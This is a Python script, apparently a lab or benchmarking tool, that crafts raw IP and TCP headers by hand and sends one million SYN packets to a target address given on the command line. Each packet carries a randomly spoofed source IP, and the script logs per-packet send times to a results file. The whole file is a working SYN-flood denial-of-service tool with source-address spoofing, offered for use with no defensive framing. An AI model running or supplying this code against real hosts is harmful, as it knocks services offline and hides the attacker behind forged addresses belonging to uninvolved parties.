import socket, sys, random
from struct import *
from datetime import datetime


# create list of random ip's to sent from
def random_ips(size=10):
    ips = []
    for _ in range(size):
        rand1 = random.randint(1, 255)
        rand2 = random.randint(1, 255)
        rand3 = random.randint(1, 255)
        rand4 = random.randint(1, 255)
        ips.append("{}.{}.{}.{}".format(rand1, rand2, rand3, rand4))
    return ips


# checksum functions needed for calculation checksum
def checksum(msg):
    c_sum = 0
    # loop taking 2 characters at a time
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i + 1]))
        c_sum = c_sum + w

    c_sum = (c_sum >> 16) + (c_sum & 0xffff)
    # c_sum = c_sum + (c_sum &gt;&gt; 16);
    # complement and mask to 4 byte short
    c_sum = ~c_sum & 0xffff

    return c_sum


# create a raw socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
except socket.error as msg:
    print('Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
    exit()

# tell kernel not to put in headers, since we are providing it
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

# now start constructing the packet
packet = ''

dest_ip = sys.argv[1]# '192.168.1.1'  # or socket.gethostbyname('www.google.com')

# ip header fields
ihl = 5
version = 4
tos = 0
tot_len = 20 + 20  # python seems to correctly fill the total length, dont know how ??
id = 54321  # Id of this packet
frag_off = 0
ttl = 255
protocol = socket.IPPROTO_TCP
check = 10  # python seems to correctly fill the checksum
daddr = socket.inet_aton(dest_ip)

ihl_version = (version << 4) + ihl


# tcp header fields
source = 1234  # source port
dest = 80  # destination port
seq = 0
ack_seq = 0
doff = 5  # 4 bit field, size of tcp header, 5 * 4 = 20 bytes
# tcp flags
fin = 0
syn = 1
rst = 0
psh = 0
ack = 0
urg = 0
window = socket.htons(5840)  # maximum allowed window size
check = 0
urg_ptr = 0

offset_res = (doff << 4) + 0
tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)


# pseudo header fields
dest_address = socket.inet_aton(dest_ip)
placeholder = 0
protocol = socket.IPPROTO_TCP


resFile = open('results_p.txt', 'a+')
avg = 0

for ip in random_ips(size=1000000):
    start = datetime.now()

    saddr = socket.inet_aton(ip)  # Spoofed Source IP

    # the ! in the pack format string means network order
    ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

    # the ! in the pack format string means network order
    tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)
    tcp_length = len(tcp_header)

    source_address = saddr

    psh = pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
    psh = psh + tcp_header
    tcp_checksum = checksum(psh)

    # make the tcp header again and fill the correct checksum
    tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)

    # final full packet - syn packets don't have any data
    packet = ip_header + tcp_header

    # send the packet
    s.sendto(packet, (dest_ip, 0))

    end = datetime.now()
    resFile.write('{}, '.format(str((end - start).microseconds)))
    avg += (end - start).microseconds

resFile.write('\nAVG : {}'.format(avg/1000000))

resFile.close()
